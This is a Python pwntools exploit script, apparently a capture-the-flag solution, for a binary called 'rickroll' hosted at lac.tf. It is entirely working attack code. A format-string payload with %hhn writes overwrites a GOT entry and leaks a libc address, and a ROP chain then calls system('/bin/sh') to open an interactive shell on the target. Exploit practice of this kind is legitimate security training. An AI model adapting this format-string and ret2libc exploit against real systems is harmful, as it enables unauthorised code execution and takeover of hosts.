from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rickroll"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31135)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


offset = 6
pop_rdi = 0x000000000040125b

payload = b"%39$018p%238c%13$hhn11111"
payload += f"%73c%14$hhn%196c%15$hhn".encode()
lenp = len(payload)
payload += p64(0x401152)
payload = payload.ljust(56, b"\0")
payload += pack(0x40406C)
payload += pack(0x404018) #plt puts
payload += pack(0x404018 + 1)

ddebug("b *0x40124e") # pop7
io.sendlineafter("Lyrics:", payload)

io.recvuntil("run around and ")
libc_start_main = int(io.recv(18), 16)
libc.address = libc_start_main - libc.symbols["__libc_start_main"] - 234
success("libc address -> " + hex(libc.address))

payload = b"a" * lenp
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols["system"])

io.sendlineafter("Lyrics:", payload)
io.interactive()
